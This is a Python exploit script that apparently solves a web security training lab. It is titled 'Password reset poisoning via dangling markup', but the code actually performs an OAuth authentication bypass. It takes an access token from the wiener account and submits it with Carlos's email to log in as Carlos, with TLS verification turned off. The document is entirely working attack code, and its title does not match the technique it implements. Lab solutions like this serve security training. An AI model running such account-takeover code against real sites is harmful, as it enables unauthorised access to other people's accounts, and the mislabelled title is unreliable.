# Password reset poisoning via dangling markup

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def authenticate(s, url, token):
	print('\n[+] Trying to authenticate as Carlos with generated token...')
	auth_path = url + '/authenticate'
	auth_data = {
		'email': 'carlos@carlos-montoya.net',
		'username': 'carlos',
		'token': token
	}
	r = s.post(auth_path, json=auth_data)
	time.sleep(1)
	if 'href="/my-account?id=carlos"' in r.text:
		print('[+] Successfully connected as Carlos !')
		return r
	else:
		print('[-] Exploit failed to connect as Carlos <!>')
		sys.exit(1)

def init_auth(s, url):
	print('\n[+] Trying to generate a oauth token logging in as Wiener...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	time.sleep(1)
	redirect_url = re.search(r"http-equiv=refresh content='3;url=(.*)'>", r.text).group(1)
	oauth_host = urllib.parse.urlparse(redirect_url).scheme + '://' + urllib.parse.urlparse(redirect_url).netloc
	print('\n[+] Found Redirection:\t%s' % redirect_url)
	print('\n[+] Found Oauth host:\t%s' % oauth_host)
	r = s.get(redirect_url)
	time.sleep(1)
	interaction_id = re.search(r'action="/interaction/(.*)/login" class=', r.text).group(1)
	print('\n[+] Found interaction id:\t%s' % interaction_id)
	login_path = f'{oauth_host}/interaction/{interaction_id}/login'
	login_data = {'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	confirm_path = f'{oauth_host}/interaction/{interaction_id}/confirm'
	r = s.post(confirm_path, allow_redirects=False)
	time.sleep(1)
	print(r.headers['Location'])
	r = s.get(r.headers['Location'], allow_redirects=False)
	time.sleep(1)
	token = re.findall(rb'/oauth-callback#access_token=(.*)&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">', r.text.encode())[0].decode()
	print('\n[+] Found Oauth token:\t%s' % token)
	return token

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Password reset poisoning via dangling markup')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way log in to the application with Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			# r = s.get(url)
			token = init_auth(s, url)
			time.sleep(2)
			r = authenticate(s, url, token)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
